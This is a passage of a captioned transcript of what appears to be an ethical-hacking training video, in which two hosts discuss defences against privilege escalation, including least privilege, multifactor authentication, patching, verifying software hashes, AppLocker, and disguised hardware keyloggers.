00:08:24.950\n>> You don't want to have those,\nthose are bad, right?\n\n173\n00:08:24.950 --> 00:08:25.808\nEven if you could automate the process.\n\n174\n00:08:25.808 --> 00:08:28.240\n>> [LAUGH]\n>> You still don't wanna have that.\n\n175\n00:08:28.240 --> 00:08:29.388\nVery, very bad, right?\n\n176\n00:08:29.388 --> 00:08:33.563\nSo make sure, right, that we try\nto reduce the privilege profile,\n\n177\n00:08:33.563 --> 00:08:37.832\nis what we would refer to it as,\nof the user by using least privilege.\n\n178\n00:08:37.832 --> 00:08:38.769\nIn addition,\n\n179\n00:08:38.769 --> 00:08:43.540\nI try to restrict the amount of code\nthat is running with these accounts.\n\n180\n00:08:43.540 --> 00:08:46.730\nIn other words, hopefully you\nare familiar with the idea of service\n\n181\n00:08:46.730 --> 00:08:47.870\naccounts in Windows.\n\n182\n00:08:47.870 --> 00:08:50.800\nWe have local service accounts,\nwe have network service accounts, we have\n\n183\n00:08:50.800 --> 00:08:54.206\nrestricted use accounts that are used with\nrestricted privileges for certain things.\n\n184\n00:08:54.206 --> 00:08:56.081\nYou and I were chatting about\nSharePoint this morning, right?\n\n185\n00:08:56.081 --> 00:09:00.265\nHaving to set it up and one of the issues\nwas hey, I don't know what it wants to be.\n\n186\n00:09:00.265 --> 00:09:03.520\nBut we have to call it, how the farm's\ngonna be structured, what accounts to use.\n\n187\n00:09:03.520 --> 00:09:05.570\nDo we do one admin account for everything?\n\n188\n00:09:05.570 --> 00:09:07.037\nFor the farm admin, for everything,\ndo we set up separate accounts?\n\n189\n00:09:07.037 --> 00:09:07.891\n>> All the service accounts, yeah.\n\n190\n00:09:07.891 --> 00:09:10.010\n>> There's all these different things,\nso you don't know.\n\n191\n00:09:10.010 --> 00:09:12.460\nAnd you got to have all these\nthings figured out ahead of time.\n\n192\n00:09:12.460 --> 00:09:14.630\nWe're not here to talk about SharePoint,\nbut just an aside,\n\n193\n00:09:14.630 --> 00:09:18.690\nbut what I'm suggesting is that\nwe have to assign privileges and\n\n194\n00:09:18.690 --> 00:09:23.430\nuser accounts and aliases and proxies to\na lot of this software to get it working.\n\n195\n00:09:23.430 --> 00:09:27.800\nThe more software running with more\naccounts and more privileges as a result,\n\n196\n00:09:27.800 --> 00:09:30.770\nthe more likely we are to find\nan account that we can escalate through.\n\n197\n00:09:30.770 --> 00:09:33.030\nSo we really have to be focused on that,\nright?\n\n198\n00:09:33.030 --> 00:09:36.720\nLook at multifactor authentication as\nopposed to single factor authentication.\n\n199\n00:09:36.720 --> 00:09:40.710\nMake sure that you are only allowing, in\nother words, authentication to take place\n\n200\n00:09:40.710 --> 00:09:44.800\nby providing one or more of the three\nthings that I'm about to describe.\n\n201\n00:09:44.800 --> 00:09:48.270\nSomething you have, something you know,\nand/or something you are.\n\n202\n00:09:48.270 --> 00:09:50.340\nThese are the three factors\nof authentication, right?\n\n203\n00:09:50.340 --> 00:09:52.777\nSo have, know, are, right?\n\n204\n00:09:52.777 --> 00:09:54.633\nAnd it's very important to know that,\n\n205\n00:09:54.633 --> 00:09:57.250\nsomething you have will\nbe something you possess.\n\n206\n00:09:57.250 --> 00:10:01.160\nCould be a smart card,\ncould be a PIN, right?\n\n207\n00:10:01.160 --> 00:10:03.340\nA digit key of some kind.\n\n208\n00:10:03.340 --> 00:10:06.470\nSomething you are is biometric related,\nit's something unique about you.\n\n209\n00:10:06.470 --> 00:10:10.434\nA voice print, an iris scan,\na fingerprint, whatever it maybe.\n\n210\n00:10:10.434 --> 00:10:13.341\nSomething that you have,\nright, we talked about that.\n\n211\n00:10:13.341 --> 00:10:14.258\n>> Yeah.\n>> Something you know.\n\n212\n00:10:14.258 --> 00:10:14.951\n>> Something you know.\n\n213\n00:10:14.951 --> 00:10:16.582\n>> Something you know is a pin, right?\n\n214\n00:10:16.582 --> 00:10:18.338\nSomething you have,\nI'm sorry something you have.\n\n215\n00:10:18.338 --> 00:10:20.431\nSomething you have would be\nsomething like a smart card.\n\n216\n00:10:20.431 --> 00:10:21.719\nI think I said that,\nI didn't do that the right way.\n\n217\n00:10:21.719 --> 00:10:22.834\nAnyway, you know what I'm talking about.\n\n218\n00:10:22.834 --> 00:10:24.736\n>> [LAUGH]\n>> [LAUGH] It's late in the day,\n\n219\n00:10:24.736 --> 00:10:25.300\nI'm sorry.\n\n220\n00:10:25.300 --> 00:10:25.810\n>> It is.\n\n221\n00:10:25.810 --> 00:10:29.460\n>> So anyway, but my point is multifactor\nauthentication will be very important.\n\n222\n00:10:29.460 --> 00:10:32.390\nWe often talk about single factor\nauthentication, one of those three,\n\n223\n00:10:32.390 --> 00:10:35.750\nand the most commonly used way to\nauthenticate today is username and\n\n224\n00:10:35.750 --> 00:10:37.940\npassword, single factor authentication.\n\n225\n00:10:37.940 --> 00:10:40.080\nIt's effective but\nit's not very secure, unfortunately,\n\n226\n00:10:40.080 --> 00:10:41.620\nfor the reasons we've talked about.\n\n227\n00:10:41.620 --> 00:10:45.300\nSo instead, you should be doing\nmultifactor authentication.\n\n228\n00:10:45.300 --> 00:10:48.610\nPeople often confuse dual and\nmultifactor authentication.\n\n229\n00:10:48.610 --> 00:10:52.290\nThey tend to use the word multifactor\nauthentication to describe both dual\n\n230\n00:10:52.290 --> 00:10:53.290\nand multi.\n\n231\n00:10:53.290 --> 00:10:56.910\nMulti can mean two, but\nit can also mean three factors.\n\n232\n00:10:56.910 --> 00:11:01.720\nThe traditional use would actually be\ndual factor for two, multi for all three.\n\n233\n00:11:01.720 --> 00:11:03.440\nIt’s up to you,\nI’m just playing semantics.\n\n234\n00:11:03.440 --> 00:11:07.680\nI’m just pointing out that you wanna do\nsomething than just simply something more.\n\n235\n00:11:07.680 --> 00:11:11.280\nThan just simply saying let’s use\nusernames and passwords to offset and\n\n236\n00:11:11.280 --> 00:11:14.430\ndefend against privilege escalations\nwould also be important.\n\n237\n00:11:14.430 --> 00:11:18.029\nMaking sure that we look at debugging\nof our code, and we look at boundary\n\n238\n00:11:18.029 --> 00:11:21.333\nchecking, input validation, and\nbuffer overflow weaknesses,\n\n239\n00:11:21.333 --> 00:11:25.463\nwith regards to the thought process around\ninjection, to make sure that injection\n\n240\n00:11:25.463 --> 00:11:28.870\nattacks can not be propagated\nto allow privilege escalation.\n\n241\n00:11:28.870 --> 00:11:32.740\nThis is linking this concept to other\nhacking tools and methodologies\n\n242\n00:11:32.740 --> 00:11:36.735\nthat can also be used, but indirectly\ncan then yield this exact result.\n\n243\n00:11:36.735 --> 00:11:39.520\nA lot of times we'll\npropagate injection attacks,\n\n244\n00:11:39.520 --> 00:11:43.780\nnot because we necessarily want the output\nof the injection attack, but rather,\n\n245\n00:11:43.780 --> 00:11:46.110\nwe want the output to be\nprivileged escalation.\n\n246\n00:11:46.110 --> 00:11:46.650\n>> Right.\n\n247\n00:11:46.650 --> 00:11:47.740\n>> Right, so that's gonna be important.\n\n248\n00:11:47.740 --> 00:11:50.520\nBuffer overflows typically\nequal privileged escalation.\n\n249\n00:11:50.520 --> 00:11:53.020\nRun services under unprivileged accounts,\nas we talked about,\n\n250\n00:11:53.020 --> 00:11:55.410\nminimize that footprint,\nit's very important as well.\n\n251\n00:11:55.410 --> 00:11:59.590\nPatch systems, people often forget that\none of the biggest things we can do,\n\n252\n00:11:59.590 --> 00:12:01.445\nin general, is doing patch management,\n\n253\n00:12:01.445 --> 00:12:05.232\ncuz this will a lot of times offset\na lot of security issues and concerns.\n\n254\n00:12:05.232 --> 00:12:11.070\nYesterday, Microsoft put out\n14 patches I think it was,\n\n255\n00:12:11.070 --> 00:12:14.420\nand that's not unusual by the way, but\n\n256\n00:12:14.420 --> 00:12:19.680\nwhat was unusual is operating system,\ninternet explorer, and Office.\n\n257\n00:12:19.680 --> 00:12:23.840\nAll three areas were patched heavily\nwith apparently some very significant\n\n258\n00:12:23.840 --> 00:12:28.448\nvulnerabilities and severity rating of\nhigh or very very high level patches.\n\n259\n00:12:28.448 --> 00:12:31.620\nWere released and the grouping and\nthe amount of them was kind of uncommon,\n\n260\n00:12:31.620 --> 00:12:35.810\ncuz we haven't had that many in the last\nsix months or so, in that area.\n\n261\n00:12:35.810 --> 00:12:39.020\nBut specific to all of the modern OS's,\nincluding Windows 10,\n\n262\n00:12:39.020 --> 00:12:43.230\nand, what was it, the Edge,\nthe Edge browser,\n\n263\n00:12:43.230 --> 00:12:46.520\nI figured it had something to do\nwith the Edge, and for Office 2016.\n\n264\n00:12:46.520 --> 00:12:50.260\nSo there was stuff going on all over\nthe place and stuff we got to be aware and\n\n265\n00:12:50.260 --> 00:12:51.445\nthink about as well.\n\n266\n00:12:51.445 --> 00:12:54.760\nSo, with regards to escalating privilege,\nvery important to think about this.\n\n267\n00:12:54.760 --> 00:12:56.500\nWhat about executing applications?\n\n268\n00:12:56.500 --> 00:12:58.190\nSo we'll talk a bit about this.\n\n269\n00:12:58.190 --> 00:13:01.870\nWhen you go and install software,\nMike, do you tend to take the step and\n\n270\n00:13:01.870 --> 00:13:06.360\ngo the extra mile of figuring out where it\ncame from, perhaps running a validation on\n\n271\n00:13:06.360 --> 00:13:09.200\nthat hash to make sure\nthe digital signature matches?\n\n272\n00:13:09.200 --> 00:13:11.703\nAnd if you tell me yes, you're lying\nto me, don't bother to do that.\n\n273\n00:13:11.703 --> 00:13:13.511\n>> [LAUGH]\n>> I saw it in your-\n\n274\n00:13:13.511 --> 00:13:14.111\n>> Like you said, the first\n\n275\n00:13:14.111 -->

00:13:16.688\nthere's absolutely no way.\n\n279\n00:13:16.688 --> 00:13:17.343\n>> The second one, no.\n\n280\n00:13:17.343 --> 00:13:18.327\nYou are not.\nThat's-\n\n281\n00:13:18.327 --> 00:13:19.159\n>> Because I know I trust the source so\n\n282\n00:13:19.159 --> 00:13:19.711\nI'm not even, yeah.\n\n283\n00:13:19.711 --> 00:13:21.611\nRight, that's my excuse\n>> Of course you

Yes.\n\n287\n00:13:24.734 --> 00:13:25.721\n>> Going down with the ship.\n\n288\n00:13:25.721 --> 00:13:28.669\nSo you know the reality is you can,\nright, but\n\n289\n00:13:28.669 --> 00:13:31.623\nas Mike,\nwell not quit without any prodding.\n\n290\n00:13:31.623 --> 00:13:32.490\n>> [LAUGH]\n>> But\n\n291\n00:13:32.490 --> 00:13:36.060\nadmitted because he was probably gonna say\nyes to both if I didn't say something.\n\n292\n00:13:36.060 --> 00:13:38.250\nBut he did admit, to his credit.\n\n293\n00:13:38.250 --> 00:13:40.840\nHe did admit that he only does\nthe first and not the second.\n\n294\n00:13:40.840 --> 00:13:43.350\nAnd here's the reality, right, and this\nis something most of you will probably\n\n295\n00:13:43.350 --> 00:13:46.830\nfind if you stop and think about what\nyou do, what your common behavior is,\n\n296\n00:13:46.830 --> 00:13:49.460\nand more importantly what\nthose around you are doing.\n\n297\n00:13:49.460 --> 00:13:54.440\nMost of us trust the provider if we\nknow it's Microsoft, Adobe, whatever.\n\n298\n00:13:54.440 --> 00:13:57.520\nWe download it,\nwe don't bother to check the hash and\n\n299\n00:13:57.520 --> 00:14:00.080\nthe digital signature on the file.\n\n300\n00:14:00.080 --> 00:14:03.010\nWe just say, well we downloaded it,\nit must be legitimate.\n\n301\n00:14:03.010 --> 00:14:05.180\nAnd as a result I'm just\ngonna go install it, right?\n\n302\n00:14:05.180 --> 00:14:08.150\nWell that's what the people in\nthe Iranian Nuclear Program thought\n\n303\n00:14:08.150 --> 00:14:12.060\nwhen they downloaded that security\npatch that actually took out those\n\n304\n00:14:12.060 --> 00:14:16.076\ncentrifuges a few years back,\nala reference Flame and Duqu.\n\n305\n00:14:16.076 --> 00:14:17.580\nIf you are up on your malware,\n\n306\n00:14:17.580 --> 00:14:21.440\nwe'll have a whole conversation\nabout malware at some point, right.\n\n307\n00:14:21.440 --> 00:14:27.720\nListen trusting without verifying\nis really problematic today, right?\n\n308\n00:14:27.720 --> 00:14:31.500\nI mean, we essentially are blindly\ntrusting, and while I'm sure that\n\n309\n00:14:31.500 --> 00:14:35.532\ndownloading software from Microsoft,\nfrom a known vendor, more often and\n\n310\n00:14:35.532 --> 00:14:39.850\nprobably almost on exception all the time,\nis not gonna lead to compromise.\n\n311\n00:14:39.850 --> 00:14:41.470\nThat's not to say that it couldn't.\n\n312\n00:14:41.470 --> 00:14:46.660\nAnd I'm not suggesting that it does, I'm\njust pointing out that when we are less\n\n313\n00:14:46.660 --> 00:14:51.780\nthan secure in our behaviors in areas\nthat we think we understand, we tend\n\n314\n00:14:51.780 --> 00:14:56.650\nto propagate that lack of oversight into\nareas that we don't understand very well.\n\n315\n00:14:56.650 --> 00:15:00.970\nAnd because we tend to act the same\nway in areas that can do us harm,\n\n316\n00:15:00.970 --> 00:15:04.440\nthis tends to lead to insecure\nbehavior and ultimately to compromise.\n\n317\n00:15:04.440 --> 00:15:06.990\nAnd so we have to think\nabout the fact that if we,\n\n318\n00:15:06.990 --> 00:15:09.250\nas security professionals, right?\n\n319\n00:15:09.250 --> 00:15:13.930\nIf we as people that should know better\nare doing this kind of stuff, right?\n\n320\n00:15:13.930 --> 00:15:15.800\nMonkey see, monkey do, right?\n\n321\n00:15:15.800 --> 00:15:18.620\nIf we're doing this, what do you think\nthe people that we are working with,\n\n322\n00:15:18.620 --> 00:15:20.950\nworking for, and working around are doing?\n\n323\n00:15:20.950 --> 00:15:22.970\nThey look to us to set the tone.\n\n324\n00:15:22.970 --> 00:15:27.320\nIf those people see us downloading\nsoftware and just executing it without\n\n325\n00:15:27.320 --> 00:15:30.980\ngiving it a second thought, why are they\ngonna stop and say is this good?\n\n326\n00:15:30.980 --> 00:15:34.535\nWhy are they gonna stop and say,\nis this appropriate, can I trust this?\n\n327\n00:15:34.535 --> 00:15:36.530\nThey're gonna do the same thing, right?\n\n328\n00:15:36.530 --> 00:15:39.799\nAnd we joke around all the time about\nthe fact that if it wasn't for users,\n\n329\n00:15:39.799 --> 00:15:43.143\nwe'd have nothing to do as security\nprofessionals, and it's very true.\n\n330\n00:15:43.143 --> 00:15:46.839\nBut it's also job security, we joke\naround about that all the time as well.\n\n331\n00:15:46.839 --> 00:15:48.773\nI thank God every day when I wake up for\n\n332\n00:15:48.773 --> 00:15:51.970\nmy users because There to keep\nme employed until I drop dead.\n\n333\n00:15:51.970 --> 00:15:53.383\n>> [LAUGH]\n>> I mean, that's just the reality, right?\n\n334\n00:15:53.383 --> 00:15:55.620\nBecause, you know,\nthere's always stuff to fix.\n\n335\n00:15:55.620 --> 00:15:58.410\nThere isn't a day that goes by that\nsomebody somewhere in the world doesn't do\n\n336\n00:15:58.410 --> 00:16:01.100\nsomething dumb that a security\nprofessional has to go fix.\n\n337\n00:16:01.100 --> 00:16:02.360\nLet's be honest, right?\n\n338\n00:16:02.360 --> 00:16:04.815\nSo, that's all good, but\nthroughout the years,\n\n339\n00:16:04.815 --> 00:16:08.625\nall joking aside, we've got to impact\nthat trend and make that stop.\n\n340\n00:16:08.625 --> 00:16:11.352\nI mean, that's one of our primary\ngoals as ethical hackers,\n\n341\n00:16:11.352 --> 00:16:15.730\nis to identify risky behavior, document\nit, call it up for what it is, and\n\n342\n00:16:15.730 --> 00:16:18.220\nthen find a way to turn\nthe tide against that.\n\n343\n00:16:18.220 --> 00:16:21.430\nExecuting applications is one of these\ngreat areas that we can have an impact in.\n\n344\n00:16:21.430 --> 00:16:24.695\nWe should never run code unless we\nvalidate not just the point of origin but\n\n345\n00:16:24.695 --> 00:16:27.237\nthe authenticity of that code\nfrom that point of origin.\n\n346\n00:16:27.237 --> 00:16:30.454\nIt's okay to say I downloaded it\nfrom Microsoft, it should be fine.\n\n347\n00:16:30.454 --> 00:16:34.930\nYeah, what if somebody, somehow,,\nsome way managed to hack in and\n\n348\n00:16:34.930 --> 00:16:38.090\nput bad code on the Microsoft Repository?\n\n349\n00:16:38.090 --> 00:16:39.546\n>> Right.\n>> And you don't know that and\n\n350\n00:16:39.546 --> 00:16:41.140\nneither does Microsoft, right?\n\n351\n00:16:41.140 --> 00:16:44.550\nIf they did, they would have fix it,\nso you just downloaded it.\n\n352\n00:16:44.550 --> 00:16:46.720\nYou trusted it comes from them, and\n\n353\n00:16:46.720 --> 00:16:48.620\nas a result the problem is that now-\n>> Mm-hm.\n\n354\n00:16:48.620 --> 00:16:52.500\n>> You make a compromise, and I wanna be\nclear, I'm not suggesting for a minute\n\n355\n00:16:52.500 --> 00:16:56.710\nthat that has ever happened or will\nhappen with regards to any one vendor.\n\n356\n00:16:56.710 --> 00:17:00.820\nI'm just simply giving you a scenario, I\ndon't wanna get the comments a month from\n\n357\n00:17:00.820 --> 00:17:05.060\nnow that, my God, Adam said that Microsoft\nwas hacked, all their software is bad,\n\n358\n00:17:05.060 --> 00:17:06.920\nand we can't trust anybody.\n\n359\n00:17:06.920 --> 00:17:09.130\nQuite the opposite,\nI did not say that at all.\n\n360\n00:17:09.130 --> 00:17:12.380\nI'm merely painting a picture and\ntelling you a hypothetical story\n\n361\n00:17:12.380 --> 00:17:15.030\nabout why it's important for\nyou to go the extra mile and\n\n362\n00:17:15.030 --> 00:17:19.870\nvalidate not just the download source but\nthe integrity of the package.\n\n363\n00:17:19.870 --> 00:17:22.140\nBecause, if somebody\nspoofs that package and\n\n364\n00:17:22.140 --> 00:17:24.830\nputs bad software in a trusted location,\n\n365\n00:17:24.830 --> 00:17:29.590\nthey're not going to be able to digitally\nsign that software and validate it with\n\n366\n00:17:29.590 --> 00:17:34.520\na key and essentially an integrity check\nhash that matches the original vendor.\n\n367\n00:17:34.520 --> 00:17:36.844\nThey're gonna spoof that and\ntry to put one up there, but\n\n368\n00:17:36.844 --> 00:17:40.186\nit's not going to match the vendor because\nit's not going to be done the way they do\n\n369\n00:17:40.186 --> 00:17:42.246\nwith the algorithms they do and\nthe way they do it.\n\n370\n00:17:42.246 --> 00:17:43.823\nIt's gonna be different, and\n\n371\n00:17:43.823 --> 00:17:47.949\nwe've shown you the reasons that that will\nbe the case in prior discussions, and\n\n372\n00:17:47.949 --> 00:17:52.014\nas we did the demo of hushing in the last\nepisode we did, so you know that that will\n\n373\n00:17:52.014 --> 00:17:54.891\nprovide a relatively secure\nvalidation point for you.\n\n374\n00:17:54.891 --> 00:17:59.233\nAnd you should pass that note along to\nyour users and make sure they know,\n\n375\n00:17:59.233 --> 00:18:00.770\nwhen in doubt, ask.\n\n376\n00:18:00.770 --> 00:18:03.695\nThat's the standing rule,\ndon't when in doubt, execute.\n\n377\n00:18:03.695 --> 00:18:05.110\n>> [LAUGH]\n>> Don't when in doubt,\n\n378\n00:18:05.110 --> 00:18:07.750\ndo it anyway, when in doubt, ask.\n\n379\n00:18:07.750 --> 00:18:12.590\nI'd rather be bothered by 100 requests for\nthe same piece of information a day,\n\n380\n00:18:12.590 --> 00:18:15.410\nthat will safeguard my network and\nmake it more secure.\n\n381\n00:18:15.410 --> 00:18:18.260\nThen I would not answer any\none of those questions or\n\n382\n00:18:18.260 --> 00:18:21.180\nI have to fix the problem that results\nfrom it as a security professional.\n\n383\n00:18:21.180 --> 00:18:22.980\nAnd you may not agree with me and\nthat's perfectly fine.\n\n384\n00:18:22.980 --> 00:18:24.610\nYou're wrong, but\nyou may not agree with me.\n\n385\n00:18:24.610 --> 00:18:25.310\n>> [LAUGH]\n>> And that's okay,\n\n386\n00:18:25.310 --> 00:18:26.550\nyou're entitled to your opinion.\n\n387\n00:18:26.550 --> 00:18:30.300\nAnd all I'm pointing out is that if you\nthink about the law of averages and\n\n388\n00:18:30.300 --> 00:18:32.550\nthe odds Associated with that bad action,\n\n389\n00:18:32.550 --> 00:18:34.890\nwhat that compromise\nmay do to your network.\n\n390\n00:18:34.890 --> 00:18:37.860\nI would much rather spend five\nminutes answering someone's email or\n\n391\n00:18:37.860 --> 00:18:41.280\nmaking a phone call and telling what not\nto do than having to fix that problem and\n\n392\n00:18:41.280 --> 00:18:43.835\nclean up afterwards that may cause hours.\n\n393\n00:18:43.835 --> 00:18:45.775\nOf delay and work, and\n\n394\n00:18:45.775 --> 00:18:50.235\ncompromises that have to be then\nmitigated and then ultimately dealt it.\n\n395\n00:18:50.235 --> 00:18:53.915\nI mean that could just be\ncatastrophic as it essentially just\n\n396\n00:18:53.915 --> 00:18:55.985\ndominos through our network\nas we've talked about.\n\n397\n00:18:55.985 --> 00:18:57.280\nSo this is a real big issue.\n\n398\n00:18:57.280 --> 00:18:58.330\nReal big concern, right?\n\n399\n00:18:58.330 --> 00:19:01.840\nSo what do we find in these\napplications that may be bad?\n\n400\n00:19:01.840 --> 00:19:05.730\nWell, it's a cornucopia of can I say,\nbad stuff on the air?\n\n401\n00:19:05.730 -->

Napster?\n\n421\n00:19:44.910 --> 00:19:45.470\n>> Yes.\n\n422\n00:19:45.470 --> 00:19:49.240\n>> Napster is actually making a come back,\nbut not in the way you'd think of.\n\n423\n00:19:49.240 --> 00:19:50.740\nThe group that bought Napster,\n\n424\n00:19:50.740 --> 00:19:53.600\nI think it's Rhapsody is that\nstreaming service that bought Napster.\n\n425\n00:19:53.600 --> 00:19:55.980\nSo they bought the remnants of\nNapster back in 2011 or 2012,\n\n426\n00:19:55.980 --> 00:19:58.120\nwhenever they went belly up.\n\n427\n00:19:58.120 --> 00:20:01.150\nAnd they own the rights to it, or\nthe shell of what's left of it.\n\n428\n00:20:01.150 --> 00:20:04.010\nBut because they're not well known they\nreally haven't been able to make a mark.\n\n429\n00:20:04.010 --> 00:20:06.350\nThey're actually,\nI read I think it was earlier today,\n\n430\n00:20:06.350 --> 00:20:08.850\nthey're changing their name to Napster,\ncause they own the rights to it,\n\n431\n00:20:08.850 --> 00:20:12.050\nto see if they can actually get people\nexcited about using it and come back.\n\n432\n00:20:12.050 --> 00:20:14.530\nSo Napster's actually going to come back,\nwhich is actually For\n\n433\n00:20:14.530 --> 00:20:16.625\npeople of my generation, really cool.\n\n434\n00:20:16.625 --> 00:20:19.160\n>> [LAUGH] And pretty smart on their part.\n\n435\n00:20:19.160 -->

we're\n\n437\n00:20:24.710 --> 00:20:28.760\ntalking about here with social engineering\nand being able to put out information and\n\n438\n00:20:28.760 --> 00:20:31.230\nPlay on that,\ncall a staff to

was pointing out.\n\n441\n00:20:34.970 --> 00:20:37.200\nYou're using something\nthat's already well-known.\n\n442\n00:20:37.200 --> 00:20:40.540\nSo game advantage, is a very tried and\ntrue security methodology.\n\n443\n00:20:40.540 --> 00:20:41.660\nBoth on the good and bad side.\n\n444\n00:20:41.660 --> 00:20:44.050\nIt's actually interesting that\nwe're talking about this stuff,\n\n445\n00:20:44.050 --> 00:20:45.260\nand that they're going to do that.\n\n446\n00:20:45.260 --> 00:20:46.790\nWhich I thought was kind of cool,\nwhen I read it.\n\n447\n00:20:46.790 --> 00:20:49.060\nI was a big Napster fan.\n\n448\n00:20:49.060 --> 00:20:51.750\nNot that I would ever use the pirated\nmusic that I found there,\n\n449\n00:20:51.750 --> 00:20:53.105\nI was just a very big fan of the service.\n\n450\n00:20:53.105 --> 00:20:54.250\n>> [LAUGH]\n>> Never did that.\n\n451\n00:20:54.250 --> 00:20:55.660\n>> They had a cool logo.\n\n452\n00:20:55.660 --> 00:20:56.310\nThat would be wrong.\n\n453\n00:20:56.310 --> 00:20:57.350\n>> Because it was unethical.\n\n454\n00:20:57.350 --> 00:20:58.436\nAnd it had a cool logo as well.\n\n455\n00:20:58.436 --> 00:21:00.270\n>> [LAUGH]\n>> Remember Limewire?\n\n456\n00:21:00.270 --> 00:21:01.980\nChair bear all that kind of stuff.\n\n457\n00:21:01.980 --> 00:21:03.410\nYeah those were the days boy.\n\n458\n00:21:03.410 --> 00:21:07.330\nSet at the server at work have no\nliability, let them get blamed.\n\n459\n00:21:07.330 --> 00:21:09.720\nLet the ISP tell them they\nshould stop doing it.\n\n460\n00:21:09.720 --> 00:21:12.730\nI love my job I really do I\nlove what I do for a living.\n\n461\n00:21:12.730 --> 00:21:16.490\nAll right so just keep in mind right\nwe have all these kinds of concerns\n\n462\n00:21:16.490 --> 00:21:17.588\nwith regards to applications.\n\n463\n00:21:17.588 --> 00:21:18.250\nOur next.\n\n464\n00:21:18.250 --> 00:21:21.030\nWe gotta really be on watch,\non guard for this.\n\n465\n00:21:21.030 --> 00:21:24.990\nDo you run any kind of software\nlocally on that super duper\n\n466\n00:21:24.990 --> 00:21:27.085\nconsumer device that you\ncall a computer of yours?\n\n467\n00:21:27.085 --> 00:21:29.140\n>> Uh-huh.\n>> Do they have anything that you guys run\n\n468\n00:21:29.140 --> 00:21:31.600\non the mac platform that\nallows you to protect against\n\n469\n00:21:31.600 --> 00:21:33.340\n>> Unauthorized software applications\n\n470\n00:21:33.340 --> 00:21:34.920\nbeing run like AppLocker?\n\n471\n00:21:34.920 --> 00:21:36.130\n>> No.\n>> You don’t have\n\n472\n00:21:36.130 --> 00:21:37.850\nany like that at the local level.\n\n473\n00:21:37.850 --> 00:21:43.060\nSo in Windows we can use BitLocker to do\nwhole disk encryption variety of things.\n\n474\n00:21:43.060 --> 00:21:44.550\nWe’ll talk about that.\n\n475\n00:21:44.550 --> 00:21:45.650\n>> But we also have AppLocker.\n\n476\n00:21:45.650 --> 00:21:49.170\nWhich is essentially policy\nbased management of executables.\n\n477\n00:21:49.170 --> 00:21:52.390\nSo, you tag the executables\nin the applications that you,\n\n478\n00:21:52.390 --> 00:21:54.980\nessentially blacklist or\nwhitelist is actually what we do.\n\n479\n00:21:54.980 --> 00:21:57.355\nYou put them on a whitelist if\nyou want them to run and policy.\n\n480\n00:21:57.355 --> 00:21:58.095\nManage them.\n\n481\n00:21:58.095 --> 00:21:59.925\nAnd you put them on\na blacklist if you don't.\n\n482\n00:21:59.925 --> 00:22:04.005\nAnd if the software is not on a list,\nit doesn't execute, essentially, right?\n\n483\n00:22:04.005 --> 00:22:05.925\nSo AdBlocker if it's deployed,\n\n484\n00:22:05.925 --> 00:22:10.420\nin the more modern OS's with group policy,\neither locally or domain managed\n\n485\n00:22:10.420 --> 00:22:14.150\nWill allow you to be able to then control\nwhat applications execute on the desktop.\n\n486\n00:22:14.150 --> 00:22:17.310\nIt's a great way to think about\napplication execution control.\n\n487\n00:22:17.310 --> 00:22:19.640\nThat's exactly what it's been created for.\n\n488\n00:22:19.640 --> 00:22:24.160\nAnd we can then control what software runs\non an endpoint, on making it safe and\n\n489\n00:22:24.160 --> 00:22:27.660\nsecure, but you guys don't have\nthat on that platform of yours.\n\n490\n00:22:27.660 --> 00:22:29.810\nEverything just works and it's all secure.\n\n491\n00:22:29.810 --> 00:22:30.710\n>> Shocking.\n\n492\n00:22:30.710 --> 00:22:34.150\nShocking that a consumer device\nsuch as yours would not have\n\n493\n00:22:34.150 --> 00:22:36.810\nEnterprise grade performance enhancing and\n\n494\n00:22:36.810 --> 00:22:39.910\nsecurity enhancing software\nsuch as I described, sir.\n\n495\n00:22:39.910 --> 00:22:41.240\nI find that shocking.\n\n496\n00:22:41.240 --> 00:22:42.860\nAbsolutely shocking, I say.\n\n497\n00:22:42.860 --> 00:22:44.240\nAll right, so.\n\n498\n00:22:44.240 --> 00:22:46.590\nWhat other things can we be\nthinking about in doing here?\n\n499\n00:22:46.590 --> 00:22:47.950\nThings like key loggers, right?\n\n500\n00:22:47.950 --> 00:22:49.160\nVery important thing about this as well.\n\n501\n00:22:49.160 --> 00:22:51.410\nI mentioned it's one type\nof software you may see.\n\n502\n00:22:51.410 --> 00:22:54.450\nYou know, key loggers are really cool\nlittle pieces of software and/or hardware,\n\n503\n00:22:54.450 --> 00:22:55.680\nand by the way they are both.\n\n504\n00:22:55.680 --> 00:22:57.540\nOne of those categories\nthat jumps between the two.\n\n505\n00:22:57.540 --> 00:23:01.490\nYou could have hardware based key loggers\nthat can take a variety of forms, so\n\n506\n00:23:01.490 --> 00:23:06.300\nfor instance right, I'm gonna hold up what\nis seemingly an innocuous looking item.\n\n507\n00:23:06.300 --> 00:23:08.760\nFor those of you that are part\nof the digital revolution and\n\n508\n00:23:08.760 --> 00:23:11.440\ndon't know what this is it's called a pen,\n\n509\n00:23:11.440 --> 00:23:14.300\nwe actually used to use them in\nthe old days To write on paper,\n\n510\n00:23:14.300 --> 00:23:17.662\nwhich you may not have ever seen if you\ndon't read books the old fashioned way.\n\n511\n00:23:17.662 --> 00:23:19.680\n>> [LAUGH]\n>> All kidding aside,\n\n512\n00:23:19.680 --> 00:23:22.540\nyou may look at this and say, well yeah,\nduh, Adam, it's a pen, no big deal.\n\n513\n00:23:22.540 --> 00:23:23.850\nRight, but you know what?\n\n514\n00:23:23.850 --> 00:23:27.515\nThis pen may actually be a key logger, and\nall I have to do is plug, yes, granted,\n\n515\n00:23:27.515 --> 00:23:28.737\nthis will be a little odd and\n\n516\n00:23:28.737 --> 00:23:31.369\nrandom having a pen dangle out\nof the back of your machine.\n\n517\n00:23:31.369 --> 00:23:35.543\nI grant you, but the reality is, it could\nbe something that is made into a key\n\n518\n00:23:35.543 --> 00:23:39.849\nlogger and it's not unusual, as a matter\nof fact I found these when we've done\n\n519\n00:23:39.849 --> 00:23:44.221\nforensic analysis and audits where I've\nactually shown up and also we've done\n\n520\n00:23:44.221 --> 00:23:48.397\ncomputer response teamwork, where\nwe've come and I've not found pens but\n\n521\n00:23:48.397 --> 00:23:53.161\nFound USB-looking devices that look, for\ninstance, like just normal jump drives,\n\n522\n00:23:53.161 --> 00:23:56.205\nthat are plugged in and\nthey are actually key loggers.\n\n523\n00:23:56.205 --> 00:24:01.600\nI have found, believe it or not,\nI'm holding up a mouse right?\n\n524\n00:24:01.600 --> 00:24:03.980\nNo ding against any particular\nvendor here at all.\n\n525\n00:24:03.980 --> 00:24:07.620\nNot saying this vendor is producing key\nloggers, quite the opposite, they're not.\n\n526\n00:24:07.620 --> 00:24:10.589\nWe know they're not because we know\nwho the vendor is but you 